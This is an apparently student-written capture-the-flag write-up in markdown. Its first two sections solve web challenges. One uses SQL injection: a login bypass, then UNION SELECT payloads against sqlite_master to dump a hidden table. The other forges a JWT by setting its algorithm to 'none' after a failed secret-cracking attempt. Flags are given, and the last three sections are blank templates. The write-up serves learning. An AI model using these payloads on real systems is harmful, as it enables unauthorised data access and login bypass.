# 1. Database Incursion V2

> Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

- First opened it up and realised it is similar to citadel CTF's challenge
- So I first bypasses login using `' OR 1=1--`
- Now that I was on database page I could read employ names and notes
- One of them talked about management team (similar to citadel CTF)
<img width="2294" height="1505" alt="image" src="https://github.com/user-attachments/assets/c4c551c3-b627-4d4e-ba9a-7574b1226212" />

- So I entered `' OR Department='Management'--` into the query box
- Now one of them hinted to ask Kiwi, so I entered `' OR Name='Kiwi'--`
- Same as citadel ctf it was limited to 4 rows so there must be one more kiwi, thus I did `' OR ID='14'--`
- It had password in notes, so I entered `ecSKsN7SES` in admin panel
- Now the next part was pretty new, I searched up more about SQL injection online and found kind of a guidebook/cheatsheet
- I looked into this documentation a bit and found to mess with multiple tables and display them or use query of one table to view another I should use `UNION` with specific syntax
- Also the metadata thing had `REDADCTED` below, which was pretty obvioously the main thing we need to find for flag
<img width="2244" height="660" alt="image" src="https://github.com/user-attachments/assets/840c4bc3-3a70-4def-83e7-60f9f1d3c46a" />

- So I read descriptions and realised I need to call metadata table to view this
- First I entered `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE tbl_name='metadata'--` and this gave me: `CREATE TABLE metadata ( id INTEGER PRIMARY KEY AUTOINCREMENT, table_name TEXT, description TEXT, columns TEXT )`
- Now we know the column name inside metadata is `table_name`, so we can use `' UNION SELECT 1, table_name, 3, 4 FROM metadata--`
- This gave me the actual name of redacted, i.e `CITADEL_ARCHIVE_2077`
- Now we need to do similar thing for `CITADEL_ARCHIVE_2077`, so I entered `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE tbl_name='CITADEL_ARCHIVE_2077'--`
- I got the column name next to TEXT as `secrets`
- So I simply did `' UNION SELECT 1, secrets, 3, 4 FROM CITADEL_ARCHIVE_2077--`
- This gave me the flag!!!


## Flag:

```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- I got to learn a lot more about SQL injection
- `UNION` was a new thing I learnt about
- Also learnt more about sql_master and how to figure stuff from columns and finding them

## Notes:

- Wasted crazy amount of time cause I was doing something wrong in first step i.e bypassing login
- We can use alternative methods for kiwi step, but I remember what I did in citadel ctf so I just did that

## Resources:

- SQL injection guide: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet


***


# 2. Temporal Token

> I made my own website with custom auth, but why can't i login with my credentials? ``` Username: Belegar Password: Ironhammer ``` Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

- First I went to website and did a dummy login and it gave invalid credentials error
- Then I tried given password and username, that did give me succeed but still didn't let me in as challenge description said
```
{
  "status": 200,
  "body": {
    "success": true
  },
  "afterCheck": {
    "status": 401,
    "body": {
      "error": "Token expired"
    }
  }
}
```
- So I tried to go to cookies and got `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjowfQ.L4UuI63oMzkmh4clZMZPoANwNxnjiYTtZO90IBhQ8B8`
- Now I decoded this with base64 decoder but got broken output `{"alg":"HS256","typ":"JWT"}{"sub":"Belegar","exp":0}R:Þƒ3hxrVLdï¿½7q8NNB`
<img width="1275" height="706" alt="msedge_QyEpPfDbDY" src="https://github.com/user-attachments/assets/e6056986-098d-4d85-a5d1-6d37529baf63" />

- Now I was aware it is a JWT
- So I searched more about it and found out I can change values on `jwt.io`
- I went there and decoded it properly, and decided to change exp time
- So I went to epoch time website, then increased it to one year from now on and decoded it that way
- I went to cookies and replaced it but it didn't work, later I realised it is HS256 so I need a valid signature
- I installed `jwt-cracker` using npm and used that with `rockyou.txt` but this didn't work
- Searched around more and realised I can try changing `alg` to `none` and if website has poor security it will just think that token is valid
- I put the final `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjoxNzk2MDQ3ODkxfQ.` token
- This worked and gave me the flag
<img width="888" height="1285" alt="image" src="https://github.com/user-attachments/assets/ab2e8efa-82ce-4d46-97ce-7efe9a898131" />


## Flag:

```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts learnt:

- I learn how to mess with JWT tokens
- I also found about different parts of it and how to change header or content
- Got an idea on how to exploit poorly secured websites

## Notes:

- I spent quite some time on cracking a valid signature to change expiry time and exploit it

## Resources:

- Base64 decoder: https://www.base64decode.org/
- JWT decoder/encoder: https://www.jwt.io/
- Epoch time convertor: https://www.epochconverter.com/
- [Handbook](https://medium.com/@shoaibbinrashid11/jwt-hacking-handbook-from-ctfs-to-real-world-pentesting-eb8850a4e833) for JWT exploits and basic idea (pretty sure this is written by AI lol, but was useful nevertheless)

***

# 3. Challenge name

> Put in the challenge's description here

## Solution:

- Include as many steps as you can with your thought process
- You **must** include images such as screenshots wherever relevant.

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{}
```

## Concepts learnt:

- Include the new topics you've come across and explain them in brief
- 

## Notes:

- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
- 

## Resources:

- Include the resources you've referred to with links. [example hyperlink](https://google.com)


***

# 4. Challenge name

> Put in the challenge's description here

## Solution:

- Include as many steps as you can with your thought process
- You **must** include images such as screenshots wherever relevant.

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{}
```

## Concepts learnt:

- Include the new topics you've come across and explain them in brief
- 

## Notes:

- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
- 

## Resources:

- Include the resources you've referred to with links. [example hyperlink](https://google.com)


***

# 5. Challenge name

> Put in the challenge's description here

## Solution:

- Include as many steps as you can with your thought process
- You **must** include images such as screenshots wherever relevant.

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{}
```

## Concepts learnt:

- Include the new topics you've come across and explain them in brief
- 

## Notes:

- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
- 

## Resources:

- Include the resources you've referred to with links. [example hyperlink](https://google.com)
